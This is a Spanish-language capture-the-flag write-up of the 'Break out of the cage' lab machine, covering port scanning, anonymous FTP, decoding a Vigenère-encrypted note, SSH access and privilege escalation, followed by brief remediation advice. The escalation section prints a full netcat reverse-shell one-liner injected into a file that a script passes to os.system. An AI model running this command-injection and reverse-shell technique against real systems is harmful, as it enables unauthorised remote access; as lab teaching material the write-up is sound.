# Break out of the cage
## Initial Scan 
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.95.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
```
## Enum
### FTP
El login anonimo esta habilitado y podemos ver el siguiente archivo
```
-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
```
Vaya tareas mas raras tiene el padre
```
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```
Si lo decodificamos en base64 nos queda lo siguiente:
```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```
Por ahora no sabemos que mas hacerle probamos los rot basicos y nada
### HTTP
#### Gobuster
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/contracts (Status: 301) <- Archivo diciendo folder not in use
/html (Status: 301) <- vacio
/images (Status: 301)
/scripts (Status: 301)
/auditions (Status: 301) <- Corrupted audio file 
/server-status (Status: 403)
```
Con el arhivo de audio obtenemos una clave en el espectrograma, si usamos esa clave como key de vigenere em el texto de las tasks, con ello obtenemos la clave de Weston para acceder por ssh
## Privesc
Primero nos va a tocar escalar lateralmente hacia cage, curiosamente somos miembros de su grupo 
```
weston@national-treasure:/$ find / -group cage 2> /dev/null
/home/cage
/opt/.dads_scripts
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files
/opt/.dads_scripts/.files/.quotes
```
Veamos ese script python
```
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```
No podemos editar el script pero si el archivo del que se leen las lineas que serán ejecutadas añadiendo una rev shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.95.54 1234 >/tmp/f
```
Una vez dentro leemos los mails , en el tercero hay una string extraña y la palabra face como 13 veces , el correo viene del root asi que estaría bien mirarlo
```
haiinspsyanileph
```
Con la contraseña del root es facil elevar privilegios

# Analisis de la intrusión
### Sensible information leak 
Esconder creds no es una buena idea en general ni con esteganografia ni con Vigenere
### Insecure Python Script
El script de las quotes puede ser utilizado para desplazarse lateralmente del usuario weston a cage debido a una mala gestión de acceso a archivos

# Soluciones
### Insecure Python Script
La solución para esto es modificar los permisos de acceso del grupo de cage a los mismos que posee el script en python de modo que no se pueda modificar de manera arbitraria
